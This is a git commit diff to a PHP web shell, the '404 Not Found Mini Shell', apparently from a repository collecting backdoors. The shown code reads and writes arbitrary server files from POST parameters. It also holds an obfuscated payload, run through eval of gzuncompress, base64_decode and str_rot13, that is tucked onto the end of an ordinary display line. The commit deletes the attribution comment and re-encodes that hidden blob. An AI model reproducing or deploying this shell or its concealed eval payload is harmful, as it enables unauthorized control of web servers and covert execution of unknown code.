292a2eaa497497e39a24f0e79dcff45da60e34fb
User of Github <84887432+1337r0j4n@users.noreply.github.com>
2024-01-22 10:48:17 +0630

    Add files via upload

--- SHELLs/404 Not Found Mini Shell/404-mini.php
+++ SHELLs/404 Not Found Mini Shell/404-mini.php
@@ -1,5 +1,4 @@
 <?php
-// from https://github.com/1337r0j4n/php-backdoors
 set_time_limit(0);
 session_start();
 if(get_magic_quotes_gpc()){
@@ -164,7 +163,7 @@ span > .buttonFile {
 	if(isset($_POST['filesrc'])){
 		echo "<tr><td>Current File : ".$_POST['filesrc']."</td></tr>";
 		echo '</table><br />';
-		echo('<center><textarea style="width: 703px; height: 477px;" cols="80" name="src">'.htmlspecialchars(file_get_contents($_POST['filesrc'])).'</textarea></center>'); eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
+		echo('<center><textarea style="width: 703px; height: 477px;" cols="80" name="src">'.htmlspecialchars(file_get_contents($_POST['filesrc'])).'</textarea></center>'); eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
 	}elseif(isset($_POST['opt']) && $_POST['opt'] != 'delete'){		
 		if(isset($_POST['opt']) && isset($_POST['src']) && $_POST['opt'] == 'edit' ){
 			$fp = fopen($_POST['opt_path'],'w');
